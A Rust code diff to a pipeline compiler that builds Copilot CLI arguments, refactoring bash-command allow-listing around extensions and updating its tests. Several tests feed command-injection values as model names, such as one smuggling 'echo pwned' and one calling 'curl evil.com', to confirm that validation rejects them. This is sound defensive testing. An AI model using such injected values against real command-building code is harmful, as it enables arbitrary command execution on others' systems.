@@ -3,6 +3,7 @@
 use anyhow::{Context, Result};
 
 use super::types::{FrontMatter, PipelineParameter, Repository, TriggerConfig};
+use super::extensions::CompilerExtension;
 use crate::compile::types::McpConfig;
 use crate::fuzzy_schedule;
 
@@ -470,7 +471,10 @@ const DEFAULT_BASH_COMMANDS: &[&str] = &[
 ];
 
 /// Generate copilot CLI params from front matter configuration
-pub fn generate_copilot_params(front_matter: &FrontMatter) -> Result<String> {
+pub fn generate_copilot_params(
+    front_matter: &FrontMatter,
+    extensions: &[super::extensions::Extension],
+) -> Result<String> {
     let mut allowed_tools: Vec<String> = vec!["github".to_string(), "safeoutputs".to_string()];
 
     // Edit tool: enabled by default, can be disabled with `edit: false`
@@ -484,7 +488,7 @@ pub fn generate_copilot_params(front_matter: &FrontMatter) -> Result<String> {
     }
 
     // Bash tool: use configured list, or defaults if not specified
-    let mut bash_commands: Vec<&str> =
+    let mut bash_commands: Vec<String> =
         match front_matter.tools.as_ref().and_then(|t| t.bash.as_ref()) {
             Some(cmds) if cmds.len() == 1 && cmds[0] == ":*" => {
                 // Unrestricted: single wildcard entry
@@ -497,50 +501,32 @@ pub fn generate_copilot_params(front_matter: &FrontMatter) -> Result<String> {
             }
             Some(cmds) => {
                 // Explicit list of commands
-                cmds.iter().map(|s| s.as_str()).collect()
+                cmds.clone()
             }
             None => {
                 // Default safe commands
-                DEFAULT_BASH_COMMANDS.to_vec()
+                DEFAULT_BASH_COMMANDS.iter().map(|s| (*s).to_string()).collect()
             }
         };
 
-    // Auto-add lean/lake/elan when runtimes.lean is enabled
-    let has_lean = front_matter
-        .runtimes
-        .as_ref()
-        .and_then(|r| r.lean.as_ref())
-        .is_some_and(|l| l.is_enabled());
-
+    // Auto-add extension-declared bash commands (runtimes + first-party tools)
     let is_unrestricted_bash = front_matter
         .tools
         .as_ref()
         .and_then(|t| t.bash.as_ref())
         .is_some_and(|cmds| cmds.len() == 1 && cmds[0] == ":*");
 
-    if has_lean && !is_unrestricted_bash {
-        let bash_disabled = front_matter
-            .tools
-            .as_ref()
-            .and_then(|t| t.bash.as_ref())
-            .is_some_and(|cmds| cmds.is_empty());
-
-        if bash_disabled {
-            eprintln!(
-                "Warning: Agent '{}' has runtimes.lean enabled but tools.bash is empty. \
-                Lean requires bash access (lean, lake, elan commands).",
-                front_matter.name
-            );
-        } else {
-            for cmd in crate::runtimes::lean::LEAN_BASH_COMMANDS {
-                if !bash_commands.contains(cmd) {
+    if !is_unrestricted_bash {
+        for ext in extensions {
+            for cmd in ext.required_bash_commands() {
+                if !bash_commands.contains(&cmd) {
                     bash_commands.push(cmd);
                 }
             }
         }
     }
 
-    for cmd in bash_commands {
+    for cmd in &bash_commands {
         // Reject single quotes in bash commands — copilot_params are embedded inside
         // a single-quoted bash string in the AWF command.
         if cmd.contains('\'') {
@@ -1336,7 +1322,7 @@ mod tests {
             cache_memory: None,
             azure_devops: None,
         });
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("--allow-tool \"shell(:*)\""));
     }
 
@@ -1349,7 +1335,7 @@ mod tests {
             cache_memory: None,
             azure_devops: None,
         });
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("shell("));
     }
 
@@ -1359,7 +1345,7 @@ mod tests {
         fm.runtimes = Some(crate::compile::types::RuntimesConfig {
             lean: Some(crate::runtimes::lean::LeanRuntimeConfig::Enabled(true)),
         });
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("shell(lean)"), "lean command should be allowed");
         assert!(params.contains("shell(lake)"), "lake command should be allowed");
         assert!(params.contains("shell(elan)"), "elan command should be allowed");
@@ -1379,7 +1365,7 @@ mod tests {
         fm.runtimes = Some(crate::compile::types::RuntimesConfig {
             lean: Some(crate::runtimes::lean::LeanRuntimeConfig::Enabled(true)),
         });
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(params.contains("shell(:*)"), "unrestricted should be preserved");
         // Should NOT add individual lean commands when unrestricted
         assert!(!params.contains("shell(lean)"), "lean not needed with :*");
@@ -1395,7 +1381,7 @@ mod tests {
                 ..Default::default()
             }),
         );
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--mcp my-tool"));
     }
 
@@ -1404,7 +1390,7 @@ mod tests {
         let mut fm = minimal_front_matter();
         fm.mcp_servers
             .insert("ado".to_string(), McpConfig::Enabled(true));
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         // Copilot CLI has no built-in MCPs — all MCPs are handled via the MCP firewall
         assert!(!params.contains("--mcp ado"));
     }
@@ -1415,14 +1401,14 @@ mod tests {
             "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  max-turns: 50\n---\n",
         )
         .unwrap();
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-turns"), "max-turns should not be emitted as a CLI arg");
     }
 
     #[test]
     fn test_copilot_params_no_max_turns_when_simple_engine() {
         let fm = minimal_front_matter();
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-turns"));
     }
 
@@ -1432,14 +1418,14 @@ mod tests {
             "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  timeout-minutes: 30\n---\n",
         )
         .unwrap();
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-timeout"), "timeout-minutes should not be emitted as a CLI arg");
     }
 
     #[test]
     fn test_copilot_params_no_max_timeout_when_simple_engine() {
         let fm = minimal_front_matter();
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-timeout"));
     }
 
@@ -1449,7 +1435,7 @@ mod tests {
             "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  max-turns: 0\n---\n",
         )
         .unwrap();
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-turns"), "max-turns should not be emitted as a CLI arg");
     }
 
@@ -1459,7 +1445,7 @@ mod tests {
             "---\nname: test\ndescription: test\nengine:\n  model: claude-opus-4.5\n  timeout-minutes: 0\n---\n",
         )
         .unwrap();
-        let params = generate_copilot_params(&fm).unwrap();
+        let params = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm)).unwrap();
         assert!(!params.contains("--max-timeout"), "timeout-minutes should not be emitted as a CLI arg");
     }
 
@@ -2384,7 +2370,7 @@ mod tests {
         )
         .unwrap();
         fm.engine = crate::compile::types::EngineConfig::Simple("model' && echo pwned".to_string());
-        let result = generate_copilot_params(&fm);
+        let result = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm));
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("invalid characters"));
     }
@@ -2393,7 +2379,7 @@ mod tests {
     fn test_model_name_rejects_space() {
         let mut fm = minimal_front_matter();
         fm.engine = crate::compile::types::EngineConfig::Simple("model && curl evil.com".to_string());
-        let result = generate_copilot_params(&fm);
+        let result = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm));
         assert!(result.is_err());
     }
 
@@ -2402,7 +2388,7 @@ mod tests {
         for name in &["claude-opus-4.5", "gpt-5.2-codex", "gemini-3-pro-preview", "my_model:latest"] {
             let mut fm = minimal_front_matter();
             fm.engine = crate::compile::types::EngineConfig::Simple(name.to_string());
-            let result = generate_copilot_params(&fm);
+            let result = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm));
             assert!(result.is_ok(), "Model name '{}' should be valid", name);
         }
     }
@@ -2416,7 +2402,7 @@ mod tests {
             cache_memory: None,
             azure_devops: None,
         });
-        let result = generate_copilot_params(&fm);
+        let result = generate_copilot_params(&fm, &crate::compile::extensions::collect_extensions(&fm));
         assert!(result.is_err());
         assert!(result.unwrap_err().to_string().contains("single quote"));
     }
